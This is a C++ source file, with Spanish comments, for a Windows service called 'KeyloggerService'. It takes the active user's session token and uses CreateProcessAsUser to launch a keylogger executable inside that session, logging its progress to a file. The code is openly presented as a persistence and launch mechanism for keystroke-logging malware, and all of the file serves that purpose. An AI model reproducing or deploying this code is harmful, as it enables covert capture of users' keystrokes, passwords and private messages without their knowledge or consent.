#include <windows.h>
#include <fstream>
#include <userenv.h>
#include <wtsapi32.h>

#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "wtsapi32.lib")

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

// Función para escribir en el archivo de log
void WriteToLog(const char* str) {
    std::ofstream log("C:\\keylog_service_log.txt", std::ios_base::app);
    if (log.is_open()) {
        log << str << std::endl;
        log.close();
    }
}

// Función para lanzar el keylogger en la sesión del usuario
void StartKeyloggerInUserSession() {
    WriteToLog("Starting keylogger in user session...");

    // Obtener la sesión activa del usuario
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    HANDLE hToken = NULL;

    // Obtener el token del usuario conectado
    if (!WTSQueryUserToken(sessionId, &hToken)) {
        WriteToLog("Failed to query user token.");
        return;
    }

    // Preparar el entorno de usuario
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.lpDesktop = const_cast<LPSTR>("winsta0\\default");

    // Crear el proceso en la sesión del usuario
    if (!CreateProcessAsUser(
        hToken,
        "C:\\Users\\cescanue\\ProyectosWin\\outcore\\tinky\\keylogger.exe",  // Ruta al keylogger
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        WriteToLog("Failed to start keylogger in user session.");
        CloseHandle(hToken);
        return;
    }

    WriteToLog("Keylogger started in user session successfully.");
    CloseHandle(hToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void ServiceMain(int argc, char** argv) {
    hStatus = RegisterServiceCtrlHandler("KeyloggerService", [](DWORD request) {
        switch (request) {
            case SERVICE_CONTROL_STOP:
            case SERVICE_CONTROL_SHUTDOWN:
                ServiceStatus.dwCurrentState = SERVICE_STOPPED;
                WriteToLog("Service stopped");
                SetServiceStatus(hStatus, &ServiceStatus);
                break;
            default:
                break;
        }
    });

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(hStatus, &ServiceStatus);

    WriteToLog("Service is starting...");

    // Lanzar el keylogger en la sesión del usuario
    StartKeyloggerInUserSession();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);
    WriteToLog("Service is running...");

    // Mantener el servicio activo
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);
    }
}

// Función principal del programa
int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"KeyloggerService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
